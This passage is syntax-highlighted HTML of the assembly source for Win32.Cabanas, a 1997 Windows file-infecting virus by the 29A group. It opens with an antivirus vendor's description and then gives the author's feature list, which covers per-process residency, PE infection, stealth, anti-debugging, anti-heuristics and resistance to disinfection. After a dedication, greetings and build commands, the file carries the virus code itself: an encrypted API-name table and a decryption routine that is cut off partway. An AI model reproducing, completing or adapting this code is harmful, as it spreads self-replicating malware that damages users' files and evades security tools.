</span><span class="sc1">; CreateFileA, CreateFileW, FindClose, FindFirstFileA, FindFirstFileW,</span><span class="sc0">
</span><span class="sc1">; FindNextFileA, FindNextFileW, SetFileAttrA, and SetFileAttrW. The virus</span><span class="sc0">
</span><span class="sc1">; "picks up" the addresses of these functions from the Import Table, and</span><span class="sc0">
</span><span class="sc1">; writes the addresses of its handlers in the Import Table. On failing to</span><span class="sc0">
</span><span class="sc1">; "intercept" certain necessary functions, the virus, when the host program</span><span class="sc0">
</span><span class="sc1">; calls for the GetProcAddress function, verifies whether this function is</span><span class="sc0">
</span><span class="sc1">; necessary for the host program, and returns the address of the virus</span><span class="sc0">
</span><span class="sc1">; procedure to host program if necessary. When a program calls for certain</span><span class="sc0">
</span><span class="sc1">; functions that have been "intercepted" by Win32.Cabanas, the file</span><span class="sc0">
</span><span class="sc1">; infection  engine and/or the stealth mechanism are\is initialized. Thus,</span><span class="sc0">
</span><span class="sc1">; when FindFirstFileA, FindFirstFileW, and FindNextFileA or FindNextFileW</span><span class="sc0">
</span><span class="sc1">; functions are called, the virus may infect the file which is being</span><span class="sc0">
</span><span class="sc1">; searched and hide the increase in the infected file size.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas cannot be regarded as a "true resident" virus, because it</span><span class="sc0">
</span><span class="sc1">; "intercepts" system functions and installs its copy in a specific memory</span><span class="sc0">
</span><span class="sc1">; area only in the current session of an infected program. But what will</span><span class="sc0">
</span><span class="sc1">; happen on starting, for example, an infected Norton Commander for Windows</span><span class="sc0">
</span><span class="sc1">; 95 or Command Interpreter for Windows NT? Or a resident program? Indeed,</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas will also "work hard" side by side with such a program until</span><span class="sc0">
</span><span class="sc1">; it is terminated.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas contains an encrypted text string</span><span class="sc0">
</span><span class="sc1">; "(c) Win32.Cabanas v1.0 by jqwerty/29A"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1997 DialogueScience, Inc., Moscow, Russia. All rights reserved.</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 3. Main featurez</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; * Platformz:      WindowsNT, Windows95, Win32s, i.e. all Win32 platformz.</span><span class="sc0">
</span><span class="sc1">; * Residency:      Yes, "Per Process", workin on all Win32 systemz.</span><span class="sc0">
</span><span class="sc1">; * Non-Residency:  Yes, direct action, infects PEz before goin resident.</span><span class="sc0">
</span><span class="sc1">; * Stealth:        Yes, size stealth of inf.filez (F-Potatoe95 fooled).</span><span class="sc0">
</span><span class="sc1">; * AntiDebuging:   Yes, TD32 or any other "aplication" level debuger</span><span class="sc0">
</span><span class="sc1">;                        generates an exception when debugin an infected</span><span class="sc0">
</span><span class="sc1">;                        aplication. This obviosly doesnt aply for Soft-ICE</span><span class="sc0">
</span><span class="sc1">;                        for Windows95, a big monster.</span><span class="sc0">
</span><span class="sc1">; * AntiHeuristicz: Yes, inf.filez have no obvious symptomz of infection.</span><span class="sc0">
</span><span class="sc1">;                        Other Win95 virusez tend to "mark" the PE header so</span><span class="sc0">
</span><span class="sc1">;                        they are easily noticeable. See: Other featurez (e).</span><span class="sc0">
</span><span class="sc1">; * AntiAntivirus:  Yes, disinfection of inf.filez is almost *imposible*.</span><span class="sc0">
</span><span class="sc1">; * Fast infection: Yes, filez are infected when accesed for any reason.</span><span class="sc0">
</span><span class="sc1">; * Polymorphism:    No, the poly engine was stripped and removed on purpose.</span><span class="sc0">
</span><span class="sc1">; * Other featurez:</span><span class="sc0">
</span><span class="sc1">;                   (a) The EntryPoint field in the PE hdr is not modified.</span><span class="sc0">
</span><span class="sc1">;                   (b) Win32 file API functionz are hooked for infection and</span><span class="sc0">
</span><span class="sc1">;                       stealth purposez but also for platform compatibility.</span><span class="sc0">
</span><span class="sc1">;                   (c) Use of the Win32 "File-Maping" API functionz, thus</span><span class="sc0">
</span><span class="sc1">;                       implementin "Memory-Mapped Filez". No more "ReadFile",</span><span class="sc0">
</span><span class="sc1">;                       "SetFilePointer", "WriteFile"... it was about time.</span><span class="sc0">
</span><span class="sc1">;                   (d) Absolutely no use of absolute adressez in sake of</span><span class="sc0">
</span><span class="sc1">;                       compatibility with other future Win32 releasez.</span><span class="sc0">
</span><span class="sc1">;                   (e) The SHAPE AV program sucks, but sadly it was the best</span><span class="sc0">
</span><span class="sc1">;                       thing detectin PE infected filez heuristicaly. Well</span><span class="sc0">
</span><span class="sc1">;                       almost as it didnt triger a single flag on this one :)</span><span class="sc0">
</span><span class="sc1">;                   (f) Use of "Structured Exception Handling" (SEH) in those</span><span class="sc0">
</span><span class="sc1">;                       critical code fragmentz that could generate GP faultz,</span><span class="sc0">
</span><span class="sc1">;                       i.e. exceptionz are intercepted and handled properly.</span><span class="sc0">
</span><span class="sc1">;                   (g) Unicode suport. This babe really works in NT. No lie.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 4. Who was Cabanas?</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Gonzalo Cabanas used to  be a daydream  believer. We shared several thingz</span><span class="sc0">
</span><span class="sc1">; in comon, heard same R.E.M music  style, wore  the same ragged blue jeanz,</span><span class="sc0">
</span><span class="sc1">; and behaved like kidz everywhere we went together, putin tackz on the tea-</span><span class="sc0">
</span><span class="sc1">; cher's chair, stealin some classmate's lunch  and so on. We even liked the</span><span class="sc0">
</span><span class="sc1">; same girlz, which explains why  we sometimez ended up punchin each other's</span><span class="sc0">
</span><span class="sc1">; face from time to time. However, u could  find us the next day, smoking a-</span><span class="sc0">
</span><span class="sc1">; round  by the skoolyard as  if nothin  had ever hapened. We  were the best</span><span class="sc0">
</span><span class="sc1">; friendz ever. I know this virus wont return him back to life, nor "will do</span><span class="sc0">
</span><span class="sc1">; him justice", however, i still wanted to somewhat dedicate this program in</span><span class="sc0">
</span><span class="sc1">; his honor.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 5. Greetz</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; The greetz go to:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Gonzo Cabanas ......... Hope to see u somewhere in time.. old pal!</span><span class="sc0">
</span><span class="sc1">;   Murkry ................ Whoa.. i like yer high-tech ideaz budie!</span><span class="sc0">
</span><span class="sc1">;   VirusBuster/29A ....... U're the i-net man pal.. keep doin it!</span><span class="sc0">
</span><span class="sc1">;   Vecna/29A ............. Keep up the good work budie.. see ya!</span><span class="sc0">
</span><span class="sc1">;   l- .................... Did ya ask for some kick-ass lil' creature? X-D</span><span class="sc0">
</span><span class="sc1">;   Int13 ................. Hey pal.. u're also a southamerican rocker! ;)</span><span class="sc0">
</span><span class="sc1">;   Peter/F-Potatoe ....... Yer description rulez.. Mikko's envy shines!</span><span class="sc0">
</span><span class="sc1">;   DV8 (H8), kdkd, etc ... Hey budiez.. now where da hell are u?</span><span class="sc0">
</span><span class="sc1">;   GriYo, Sandy/29A ...... Thx for yer patience heh X-D</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 6. Disclaimer</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This source code is for educational  purposez only. The author is not res-</span><span class="sc0">
</span><span class="sc1">; ponsable for any problemz caused due to the assembly of this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 7. Compiling it</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; tasm32 -ml -m5 -q -zn cabanas.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 -Tpe -c -x -aa cabanas,,, import32</span><span class="sc0">
</span><span class="sc1">; pewrsec cabanas.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1997 Jacky Qwerty/29A.</span><span class="sc0">


</span><span class="sc2">.386p</span><span class="sc0">           </span><span class="sc1">;generate 386+ protected mode instructionz</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">    </span><span class="sc1">;no segmentz and a full 32-bit offset.. what a dream ;)</span><span class="sc0">

</span><span class="sc1">;Some includez containin very useful structurez and constantz for Win32</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32API.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PE.inc</span><span class="sc0">

</span><span class="sc1">;Some equ's needed by the virus</span><span class="sc0">

</span><span class="sc5">nAPIS</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">         </span><span class="sc1">;size of jump table holdin hooked APIz</span><span class="sc0">
</span><span class="sc5">nHANDLEZ</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">   </span><span class="sc1">;size of Handlez table</span><span class="sc0">
</span><span class="sc5">nPATHNAMEZ</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">   </span><span class="sc1">;size of PathNamez table</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc1">;APIz used durin first generation only</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetProcAddress</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;some dummy data so tlink32 dont yell</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;Virus code starts here</span><span class="sc0">

</span><span class="sc5">v_start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base</span><span class="sc0">

</span><span class="sc5">code_table</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">12345678h</span><span class="sc0">       </span><span class="sc1">;host RVA entry point</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;number of bytez</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;bytez to patch</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;end of parameter block</span><span class="sc0">

</span><span class="sc5">code_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;Packed APIz needed by the virus. They will travel in packed/encrypted form</span><span class="sc0">

</span><span class="sc5">ve_stringz</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">veszKernel32</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetModuleHandleA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleA'</span><span class="sc0">
</span><span class="sc5">veszGetModuleHandleW</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc0">

</span><span class="sc5">eExts</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'fxEtcR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;list of file extensionz</span><span class="sc0">

</span><span class="sc5">veszGetProcAddress</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetFileAttributesA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Ge'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'AttributesA'</span><span class="sc0">
</span><span class="sc5">veszGetFileAttributesW</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">veszMoveFileExA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Mov'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'ExA'</span><span class="sc0">
</span><span class="sc5">veszMoveFileExW</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">vesz_lopen</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'_lopen'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszCopyFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Cop'</span><span class="sc4">,</span><span class="sc12">'y'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">veszCopyFileW</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">veszOpenFile</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Ope'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszMoveFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Mov'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">veszMoveFileW</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">veszCreateProcessA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateProcessA'</span><span class="sc0">
</span><span class="sc5">veszCreateProcessW</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">veszCreateFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Creat'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">veszCreateFileW</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">veszFindClose</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszFindFirstFileA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirs'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">veszFindFirstFileW</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">veszFindNextFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNex'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">veszFindNextFileW</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">veszSetFileAttributesA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Se'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'AttributesA'</span><span class="sc0">
</span><span class="sc5">veszSetFileAttributesW</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">veszCloseHandle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszCreateFileMappingA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Creat'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'MappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszMapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MapViewO'</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszUnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'UnmapViewO'</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetFilePointer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Se'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'Pointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetEndOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetEndO'</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetFileTime</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Se'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'Time'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetWindowsDirectory</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetSystemDirectory</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetCurrentProcess</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetCurrentProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetModuleFileName</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModul'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc12">'NameA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszWriteProcessMemory</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WriteProcessMemory'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszWideCharToMultiByte</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WideCharToMultiByte'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszVirtualAlloc</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'VirtualAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">eEndOfFunctionNamez</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;Copyright and versionz</span><span class="sc0">

</span><span class="sc5">eszCopyright</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) Win32.Cabanas v1.1 by jqwerty/29A."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ve_string_size</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc0">

</span><span class="sc5">get_base</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ve_string_size</span><span class="sc0">      </span><span class="sc1">;get size of packed/encrypted stringz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get pointer to packed/encrypted stringz</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc5">code_table</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">seh_fn</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;set SEH frame.. ever seen FS in action? X-D</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pCodeTable</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;save pointer to code_table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">delta_host</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;save actual host base adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;save pointer to virus start</span><span class="sc0">

</span><span class="sc5">ebp_num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
</span><span class="sc5">tmp_edi</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">pcode_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;go away lamerz and wannabeez..</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Dh</span><span class="sc0">

</span><span class="sc5">seh_rs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">tmp_edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_stringz</span><span class="sc0"> </span><span class="sc1">;get pointer to KERNEL32 API name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;pass the pointer twice</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">decrypt_stringz</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;decrypt/unpack API namez and other stringz</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">d_stor</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">d_file</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;expand/unpack unicode API name</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
